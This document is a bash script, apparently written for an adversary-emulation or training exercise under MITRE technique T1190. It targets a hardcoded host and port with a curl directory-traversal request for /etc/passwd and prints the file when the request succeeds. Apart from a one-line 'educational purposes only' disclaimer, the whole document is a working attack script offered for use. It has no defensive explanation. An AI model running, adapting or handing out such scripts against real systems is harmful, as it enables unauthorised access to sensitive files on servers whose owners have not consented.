#!/bin/bash

# T1190: Exploit Public-Facing Application Script
# This script attempts to exploit a vulnerable public-facing application to gain initial access to the target host.
# WARNING: This script is for educational purposes only. Unauthorized access to computer systems is illegal.

TARGET="100.0.0.40"
PORT=8001

# Check if the target is up
ping -c 1 $TARGET &> /dev/null
if [ $? -ne 0 ]; then
    echo "[-] Target $TARGET is not reachable."
    exit 1
fi

# Attempting directory traversal exploit to gain initial access
echo "[+] Attempting directory traversal exploit on $TARGET:$PORT..."

curl -s -o exploit_output.txt "http://$TARGET:$PORT/../../../../../../etc/passwd"

if grep -q "root:" exploit_output.txt; then
    echo "[+] Exploit successful. Gained access to sensitive file: /etc/passwd"
    cat exploit_output.txt
else
    echo "[-] Exploit failed or target is not vulnerable."
fi

